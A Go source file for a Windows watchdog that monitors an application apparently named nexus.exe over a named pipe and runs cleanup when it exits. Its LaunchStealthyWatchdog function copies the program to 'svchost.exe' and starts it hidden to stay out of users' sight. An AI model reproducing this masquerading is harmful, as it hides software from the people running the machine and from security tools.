package watchdog

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"time"

	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/sys/windows"
)

const (
	// PipeName is the name of the named pipe used for IPC on Windows
	PipeName = "\\\\.\\pipe\\nexus_watchdog"
)

type Watchdog struct {
	mainProcess     *os.Process
	mainProcessPath string
	pid             int
	cleanupFuncs    []func()
	wg              sync.WaitGroup
	stopChan        chan struct{}
	accountActive   bool
	logger          *zap.Logger
	logFile         *os.File
}

type WatchdogState struct {
	MainPID       int      `json:"mainPid"`
	NeedsCleanup  bool     `json:"needsCleanup"`
	AccountActive bool     `json:"accountActive"`
	DataToSave    []string `json:"dataToSave"`
	LastUpdated   int64    `json:"lastUpdated"`
}

// WatchdogMessage represents a message sent to the watchdog
type WatchdogMessage struct {
	Type          string    `json:"type"`
	AccountActive bool      `json:"accountActive"`
	Timestamp     time.Time `json:"timestamp"`
}

// WatchdogClient is a lightweight client for communicating with the watchdog process
type WatchdogClient struct {
	logger *zap.Logger
}

// NewWatchdogClient creates a new watchdog client for communicating with the watchdog process
func NewWatchdogClient() *WatchdogClient {
	logger, _ := zap.NewProduction()
	return &WatchdogClient{
		logger: logger,
	}
}

// Update implements the WatchdogUpdater interface
// It sends an account status update to the watchdog process via named pipe
func (c *WatchdogClient) Update(active bool) error {
	c.logger.Info("Updating watchdog account status via named pipe",
		zap.Bool("active", active))

	// Prepare the message
	msg := WatchdogMessage{
		Type:          "account_status",
		AccountActive: active,
		Timestamp:     time.Now(),
	}

	// Marshal the message to JSON
	data, err := json.Marshal(msg)
	if err != nil {
		c.logger.Error("Failed to marshal message", zap.Error(err))
		return fmt.Errorf("failed to marshal message: %w", err)
	}

	// Connect to the named pipe
	pipePath := PipeName
	c.logger.Debug("Connecting to named pipe", zap.String("path", pipePath))

	for i := 0; i < 3; i++ { // Try 3 times
		pipe, err := windows.CreateFile(
			windows.StringToUTF16Ptr(pipePath),
			windows.GENERIC_WRITE,
			0,
			nil,
			windows.OPEN_EXISTING,
			windows.FILE_ATTRIBUTE_NORMAL,
			0,
		)

		if err != nil {
			c.logger.Warn("Failed to open pipe, retrying...", zap.Error(err), zap.Int("attempt", i+1))
			time.Sleep(500 * time.Millisecond)
			continue
		}

		defer windows.CloseHandle(pipe)

		// Create a buffer for the data
		buffer := make([]byte, len(data))
		copy(buffer, data)

		var bytesWritten uint32
		err = windows.WriteFile(
			pipe,
			buffer,
			&bytesWritten,
			nil,
		)
		if err != nil {
			c.logger.Error("Failed to write to pipe", zap.Error(err))
			return fmt.Errorf("failed to send message: %w", err)
		}

		c.logger.Info("Successfully sent watchdog message via named pipe",
			zap.String("type", msg.Type),
			zap.Bool("accountActive", active))
		return nil
	}

	c.logger.Error("Failed to connect to watchdog pipe after retries")
	return fmt.Errorf("failed to connect to watchdog pipe after retries")
}

// Update updates the account status by sending a message to the watchdog
func Update(active bool) error {
	// Create a logger
	logger, _ := zap.NewProduction()
	defer logger.Sync()

	logger.Info("Updating watchdog account status via named pipe",
		zap.Bool("active", active))

	// Prepare the message
	msg := WatchdogMessage{
		Type:          "account_status",
		AccountActive: active,
		Timestamp:     time.Now(),
	}

	// Marshal the message to JSON
	data, err := json.Marshal(msg)
	if err != nil {
		logger.Error("Failed to marshal message", zap.Error(err))
		return fmt.Errorf("failed to marshal message: %w", err)
	}

	// Connect to the named pipe
	pipePath := PipeName
	logger.Debug("Connecting to named pipe", zap.String("path", pipePath))

	for i := 0; i < 3; i++ { // Try 3 times
		pipe, err := windows.CreateFile(
			windows.StringToUTF16Ptr(pipePath),
			windows.GENERIC_WRITE,
			0,
			nil,
			windows.OPEN_EXISTING,
			windows.FILE_ATTRIBUTE_NORMAL,
			0,
		)

		if err != nil {
			logger.Warn("Failed to open pipe, retrying...", zap.Error(err), zap.Int("attempt", i+1))
			time.Sleep(500 * time.Millisecond)
			continue
		}

		defer windows.CloseHandle(pipe)

		// Create a buffer for the data
		buffer := make([]byte, len(data))
		copy(buffer, data)

		var bytesWritten uint32
		err = windows.WriteFile(
			pipe,
			buffer,        // Use buffer directly as []byte
			&bytesWritten, // Pass pointer to bytesWritten
			nil,           // Overlapped parameter
		)
		if err != nil {
			logger.Error("Failed to write to pipe", zap.Error(err))
			return fmt.Errorf("failed to send message: %w", err)
		}

		logger.Info("Successfully sent watchdog message via named pipe",
			zap.String("type", msg.Type),
			zap.Bool("accountActive", active))
		return nil
	}

	logger.Error("Failed to connect to watchdog pipe after retries")
	return fmt.Errorf("failed to connect to watchdog pipe after retries")
}

// StartNamedPipeServer starts a named pipe server to receive messages from clients
func StartNamedPipeServer(w *Watchdog) error {
	pipePath := PipeName
	w.logger.Info("Starting watchdog named pipe server", zap.String("path", pipePath))

	w.wg.Add(1)
	go func() {
		defer w.wg.Done()

		for {
			// Create the named pipe
			pipeHandle, err := windows.CreateNamedPipe(
				windows.StringToUTF16Ptr(pipePath),
				windows.PIPE_ACCESS_INBOUND,
				windows.PIPE_TYPE_MESSAGE|windows.PIPE_READMODE_MESSAGE|windows.PIPE_WAIT,
				windows.PIPE_UNLIMITED_INSTANCES,
				4096, // output buffer size
				4096, // input buffer size
				0,    // default timeout
				nil,  // default security attributes
			)

			if err != nil {
				w.logger.Error("Failed to create named pipe", zap.Error(err))

				// Check if we need to exit
				select {
				case <-w.stopChan:
					w.logger.Info("Pipe server shutting down")
					return
				default:
					// Sleep a bit before retrying
					time.Sleep(1 * time.Second)
					continue
				}
			}

			// Wait for a client to connect
			w.logger.Debug("Waiting for client connection on named pipe")
			err = windows.ConnectNamedPipe(pipeHandle, nil)
			if err != nil {
				w.logger.Error("Error connecting to client", zap.Error(err))
				windows.CloseHandle(pipeHandle)

				// Check if we need to exit
				select {
				case <-w.stopChan:
					w.logger.Info("Pipe server shutting down")
					return
				default:
					continue
				}
			}

			// Handle the connection in a new goroutine
			go w.handlePipeConnection(pipeHandle)
		}
	}()

	return nil
}

// handlePipeConnection processes incoming messages from the named pipe
func (w *Watchdog) handlePipeConnection(pipeHandle windows.Handle) {
	defer windows.CloseHandle(pipeHandle)

	// Create a file from the pipe handle for easier reading
	pipeFile := os.NewFile(uintptr(pipeHandle), PipeName)
	defer pipeFile.Close()

	// Read the message
	buf := make([]byte, 1024)
	n, err := pipeFile.Read(buf)
	if err != nil && err != io.EOF {
		w.logger.Error("Error reading from pipe", zap.Error(err))
		return
	}

	// Parse the message
	var msg WatchdogMessage
	if err := json.Unmarshal(buf[:n], &msg); err != nil {
		w.logger.Error("Error unmarshaling message", zap.Error(err))
		return
	}

	w.logger.Info("Received message via named pipe",
		zap.String("type", msg.Type),
		zap.Bool("accountActive", msg.AccountActive),
		zap.Time("timestamp", msg.Timestamp))

	// Process the message based on type
	switch msg.Type {
	case "account_status":
		w.UpdateAccountStatus(msg.AccountActive)
	default:
		w.logger.Warn("Unknown message type", zap.String("type", msg.Type))
	}
}

// LaunchStealthyWatchdog launches the watchdog process in a way that makes it less visible to users
func LaunchStealthyWatchdog(executablePath string, mainPID int) (*os.Process, error) {
	// Prepare the command
	attr := &syscall.ProcAttr{
		Dir: filepath.Dir(executablePath),
		Env: os.Environ(),
		Sys: &syscall.SysProcAttr{
			HideWindow:    true, // Hide the console window
			CreationFlags: 0x08000000,
		},
		Files: []uintptr{0, 0, 0}, // No standard input/output/error
	}

	// Generate a generic process name (use the path but rename the executable)
	genericPath := executablePath
	if filepath.Base(executablePath) == "nexus.exe" {
		// Rename to something generic
		dir := filepath.Dir(executablePath)
		genericPath = filepath.Join(dir, "svchost.exe")

		// Copy the executable to the generic name if it doesn't exist
		if _, err := os.Stat(genericPath); os.IsNotExist(err) {
			data, err := os.ReadFile(executablePath)
			if err != nil {
				return nil, fmt.Errorf("failed to read executable: %w", err)
			}
			if err := os.WriteFile(genericPath, data, 0755); err != nil {
				return nil, fmt.Errorf("failed to create generic executable: %w", err)
			}
		}
	}

	// Arguments for the watchdog
	args := []string{genericPath, "--watchdog", fmt.Sprintf("%d", mainPID)}

	// Start the process
	pid, _, err := syscall.StartProcess(genericPath, args, attr)
	if err != nil {
		return nil, fmt.Errorf("failed to start watchdog: %w", err)
	}

	// Create an os.Process from the syscall.Process
	return os.FindProcess(pid)
}

// InitializeStealthMode sets up the watchdog process to be less visible
func InitializeStealthMode() error {
	// Get current process
	currentProcess := windows.CurrentProcess()

	// Set generic description for the process
	err := windows.SetProcessPriorityBoost(currentProcess, false)
	if err != nil {
		return fmt.Errorf("failed to set priority boost: %w", err)
	}

	// Set the process as background process
	err = windows.SetPriorityClass(currentProcess, windows.PROCESS_MODE_BACKGROUND_BEGIN)
	if err != nil {
		return fmt.Errorf("failed to set as background process: %w", err)
	}

	return nil
}

// UpdateAccountStatus updates the account status in memory
func (w *Watchdog) UpdateAccountStatus(active bool) {
	w.logger.Info("Updating account status", zap.Bool("active", active))
	w.accountActive = active
}

// New creates a new watchdog instance
func New(mainPID int, mainProcessPath string) *Watchdog {
	if err := InitializeStealthMode(); err != nil {
		fmt.Printf("Failed to initialize stealth mode: %v\n", err)
	}

	// Create logs directory if it doesn't exist
	logsDir := filepath.Join(filepath.Dir(mainProcessPath), "logs")
	if err := os.MkdirAll(logsDir, 0755); err != nil {
		fmt.Printf("Failed to create logs directory: %v\n", err)
	}

	// Create log file with timestamp in name
	logPath := filepath.Join(logsDir, fmt.Sprintf("watchdog_%d_%s.log",
		mainPID, time.Now().Format("20060102_150405")))
	logFile, err := os.Create(logPath)
	if err != nil {
		fmt.Printf("Failed to create log file: %v\n", err)
	}

	// Configure zap logger with maximum verbosity
	encoderConfig := zapcore.EncoderConfig{
		TimeKey:        "time",
		LevelKey:       "level",
		NameKey:        "logger",
		CallerKey:      "caller",
		MessageKey:     "msg",
		StacktraceKey:  "stacktrace",
		LineEnding:     zapcore.DefaultLineEnding,
		EncodeLevel:    zapcore.CapitalLevelEncoder,
		EncodeTime:     zapcore.ISO8601TimeEncoder,
		EncodeDuration: zapcore.StringDurationEncoder,
		EncodeCaller:   zapcore.ShortCallerEncoder,
	}

	core := zapcore.NewCore(
		zapcore.NewJSONEncoder(encoderConfig),
		zapcore.AddSync(logFile),
		zap.DebugLevel,
	)
	logger := zap.New(core, zap.AddCaller(), zap.AddStacktrace(zap.ErrorLevel))

	watchdog := &Watchdog{
		mainProcess:     nil,
		mainProcessPath: mainProcessPath,
		pid:             mainPID,
		cleanupFuncs:    []func(){},
		stopChan:        make(chan struct{}),
		logger:          logger,
		logFile:         logFile,
	}

	logger.Info("Watchdog initialized",
		zap.Int("mainPID", mainPID),
		zap.String("mainProcessPath", mainProcessPath),
		zap.String("logPath", logPath))

	// Initialize the named pipe server
	err = StartNamedPipeServer(watchdog)
	if err != nil {
		logger.Error("Failed to start named pipe server", zap.Error(err))
		// Continue anyway, as we'll retry in the main loop
	}

	return watchdog
}

func (w *Watchdog) AddCleanupFunction(fn func()) {
	w.logger.Debug("Adding cleanup function to watchdog")
	w.cleanupFuncs = append(w.cleanupFuncs, fn)
	w.logger.Info("Cleanup function added", zap.Int("totalFunctions", len(w.cleanupFuncs)))
}

func (w *Watchdog) LoadState() (*WatchdogState, error) {
	// This method is needed by other parts of the code
	// Return a dummy state for now since we're using named pipes for communication
	return &WatchdogState{
		MainPID:       w.pid,
		NeedsCleanup:  false,
		AccountActive: w.accountActive,
		LastUpdated:   time.Now().Unix(),
	}, nil
}

func (w *Watchdog) SaveState(state WatchdogState) error {
	// State is now maintained in memory, no need to save to a file
	w.accountActive = state.AccountActive
	return nil
}

func (w *Watchdog) Start() error {
	w.logger.Info("Starting watchdog", zap.Int("forPID", w.pid))

	// Existing code...
	proc, err := os.FindProcess(w.pid)
	if err != nil {
		w.logger.Error("Failed to find main process", zap.Error(err), zap.Int("pid", w.pid))
		return err
	}
	w.mainProcess = proc
	w.logger.Debug("Main process found", zap.Int("pid", w.pid))

	w.wg.Add(1)
	go w.monitorLoop()
	w.logger.Info("Watchdog monitor loop started")

	return nil
}

func (w *Watchdog) monitorLoop() {
	defer w.wg.Done()

	ticker := time.NewTicker(1 * time.Second)
	heartbeat := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	defer heartbeat.Stop()

	w.logger.Info("Monitor loop initialized",
		zap.Duration("checkInterval", 1*time.Second),
		zap.Duration("heartbeatInterval", 10*time.Second))

	for {
		select {
		case <-ticker.C:
			// Check if main process is still running
			isRunning := isProcessRunning(w.pid)
			if !isRunning {
				w.logger.Warn("Main process not responding",
					zap.Int("pid", w.pid))

				w.logger.Info("Initiating cleanup sequence")
				w.performCleanup()
				return
			}

		case <-heartbeat.C:
			// Just log a heartbeat
			w.logger.Debug("Heartbeat: watchdog still running")

		case <-w.stopChan:
			w.logger.Info("Stop signal received, terminating monitor loop")
			return
		}
	}
}

// isProcessRunning checks if a process with the given PID is running
func isProcessRunning(pid int) bool {
	_, err := os.FindProcess(pid)
	if err != nil {
		return false
	}

	// Windows-specific approach to check if process exists
	h, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}

	var exitCode uint32
	err = syscall.GetExitCodeProcess(h, &exitCode)
	syscall.CloseHandle(h)

	return err == nil && exitCode == 259 // STILL_ACTIVE = 259
}

func (w *Watchdog) performCleanup() {
	w.logger.Info("Performing cleanup operations",
		zap.Int("registeredFunctions", len(w.cleanupFuncs)),
		zap.Bool("accountActive", w.accountActive))

	// Perform all registered cleanup functions
	for i, fn := range w.cleanupFuncs {
		w.logger.Debug("Executing cleanup function", zap.Int("functionIndex", i))
		func() {
			defer func() {
				if r := recover(); r != nil {
					w.logger.Error("Panic in cleanup function",
						zap.Int("functionIndex", i),
						zap.Any("recovery", r))
				}
			}()
			fn()
		}()
		w.logger.Debug("Cleanup function completed", zap.Int("functionIndex", i))
	}

	w.logger.Info("Cleanup completed")

	// Flush logs before exiting
	if err := w.logger.Sync(); err != nil {
		fmt.Printf("Failed to sync logger: %v\n", err)
	}
	if w.logFile != nil {
		w.logFile.Close()
	}
}

func (w *Watchdog) Stop() {
	w.logger.Info("Stopping watchdog")
	close(w.stopChan)
	w.wg.Wait()

	// Flush logs
	if err := w.logger.Sync(); err != nil {
		fmt.Printf("Failed to sync logger: %v\n", err)
	}
	if w.logFile != nil {
		w.logFile.Close()
	}

	w.logger.Info("Watchdog stopped")
}

func (w *Watchdog) CheckForRecoveryNeeded() bool {
	return w.accountActive
}

// IsRunning checks if the main process is still running
func (w *Watchdog) IsRunning() bool {
	select {
	case <-w.stopChan:
		return false
	default:
		return isProcessRunning(w.pid)
	}
}
